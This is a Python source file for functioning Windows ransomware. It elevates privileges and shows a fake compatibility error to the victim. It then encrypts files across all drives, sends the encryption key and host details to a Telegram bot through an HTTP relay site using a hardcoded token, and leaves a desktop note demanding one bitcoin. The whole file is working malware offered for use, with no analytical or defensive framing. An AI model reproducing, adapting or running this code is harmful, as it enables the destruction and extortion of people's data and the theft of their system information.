from cryptography.fernet import Fernet
from subprocess import check_output
import os, requests
from elevate import elevate
from getpass import getuser
import ctypes
from win10toast import ToastNotifier
from platform import uname

MB_OK = 0x0
MB_OKCXL = 0x01
MB_YESNOCXL = 0x03
MB_YESNO = 0x04
MB_HELP = 0x4000
ICON_EXLAIM = 0x30
ICON_INFO = 0x40
ICON_STOP = 0x10

# sending interface
url = 'https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx'
token = '5187329742:AAG6NSkdwdw37NL4U66evnrqSNGaNahE184'
chat_id = '117348935'
key = ''


def encrypt_files(user_token=token, user_chat_id=chat_id):
    global token, chat_id

    token = user_token

    chat_id = user_chat_id

    key = Fernet.generate_key()

    fernet_algorithm = Fernet(key)

    send_info_to_telegram_bot(key)

    drives = find_drives()

    formats = ['exe', 'png', 'jpg', 'jpeg', 'psd', 'py', 'js', 'ai', 'mp3', 'txt', 'mp4', 'docx', 'pkt', 'pcap', 'log',
               'ibd', 'mar', 'te', 'ddl', 'dtsx', 'gdb', 'trm', 'itw', 'teacher', 'accdc', 'itdb', 'nyf', 'pdb',
               'sqlitedb', 'mdf', 'db', 'go']

    for drive in drives:

        # first element is not drive name
        if drives.index(drive) == 0:
            continue

        drive = make_drive_name_correct(drive)

        for format in formats:
            try:
                with open('log', 'w') as error_log:

                    locations = find_location(error_log, format, drive)

                    for location in locations:
                        write_new_data(location, fernet_algorithm, write_encrypted_data)


            except:
                pass


def decrypt_files():
    global key

    fernet_algorithm = Fernet(key)

    drives = find_drives()

    formats = ['exe', 'png', 'jpg', 'jpeg', 'psd', 'py', 'js', 'ai', 'mp3', 'txt', 'mp4', 'docx', 'pkt', 'pcap', 'log',
               'ibd', 'mar', 'te', 'ddl', 'dtsx', 'gdb', 'trm', 'itw', 'teacher', 'accdc', 'itdb', 'nyf', 'pdb',
               'sqlitedb', 'mdf', 'db', 'go']

    for drive in drives:

        # first element is not drive name
        if drives.index(drive) == 0:
            continue

        drive = make_drive_name_correct(drive)

        for format in formats:
            try:
                with open('log', 'w') as error_log:

                    locations = find_location(error_log, format, drive)

                    for location in locations:
                        write_new_data(location, fernet_algorithm, write_decrypted_data)


            except:
                pass


def make_drive_name_correct(drive):
    drive = drive.decode()
    drive = drive.replace('\\', '')
    drive = drive.replace('C:', '/')
    return drive


def write_new_data(location, fernet_algorithm, write_data):
    with open(location, 'rb') as file:
        write_data(file, fernet_algorithm, location)


def encrypt_file_data(file, fernet_algorithm):
    data = file.read()
    encrypt_data = fernet_algorithm.encrypt(data)
    return encrypt_data


def write_encrypted_data(file, fernet_algorithm, location):
    encrypt_data = encrypt_file_data(file, fernet_algorithm)
    # create new file and write encrypted data in it
    new_file = open(location, 'wb')
    new_file.write(encrypt_data)
    file.close()
    new_file.close()


def write_decrypted_data(file, fernet_algorithm, location):
    data = file.read()
    decrypted_data = fernet_algorithm.decrypt(data)
    # create new file and write encrypted data in it
    new_file = open(location, 'wb')
    new_file.write(decrypted_data)
    file.close()
    new_file.close()


def find_location(error_log, format, drive):
    locations = check_output(f'{drive} && dir /S /B *.{format}', shell=True, stderr=error_log)

    locations = locations.decode().replace(' ', '').split()

    return locations


def find_drives():
    drives = check_output('fsutil fsinfo drives', shell=True)

    drives = drives.split()

    return drives


def send_info_to_telegram_bot(key):
    message = create_message(key)
    send_message_to_telegram_bot(message=message)


def create_message(key):
    info = uname()
    message = f'System : {info[0]}\nNode : {info[1]}\nrelease : {info[2]}\nVersion : {info[3]}\nMachine : {info[4]}' \
              f'\nProcessor : {info[5]}\n'
    message += f'Key : {key}\n'
    message += f'User : {getuser()}\n'
    return message


def send_message_to_telegram_bot(message):
    global token, chat_id

    telegram_api = f'https://api.telegram.org/bot{token}/SendMessage?chat_id={chat_id}&text={str(message)}'

    send_request(telegram_api)


def send_request(telegram_api):
    global url

    payload = {
        'UrlBox': telegram_api,
        'AgentList': 'Mozilla Firefox',
        'VersionsList': 'HTTP/1.1',
        'MethodList': 'POST'
    }

    result = requests.post(url, payload)

    return result


# show error to victim
def show_error_window():
    ctypes.windll.user32.MessageBoxA(0,
                                     b'This verison of this file is not compatible with the version of Windows you\'re running. Check your computer\'s system information to see whether you need an x86 (32-bit) or x64 (64-bit) verion of the program',
                                     b'Error',
                                     ICON_STOP | MB_OK)


# create a not for victim
def create_note():
    path = os.path.expanduser('~') + '\\Desktop'

    with open(path + f'\\for_{getuser()}.txt', 'w') as file:
        message = '''
Message : Hello, if you want your information back you should send me 1BTC and you got 24 hours otherwise you lose your info good luck.
BTC Wallet Address: None
My Telegram ID : None'''
        file.write(message)
        file.close()


# show notification to victim
def show_notification():
    ToastNotifier().show_toast('All files are encrypted', 'Check your Desktop we left you a note',
                               icon_path='icons/hacked.ico')


if __name__ == '__main__':
    elevate(show_console=False)
    show_error_window()
    encrypt_files()
    show_notification()
    create_note()
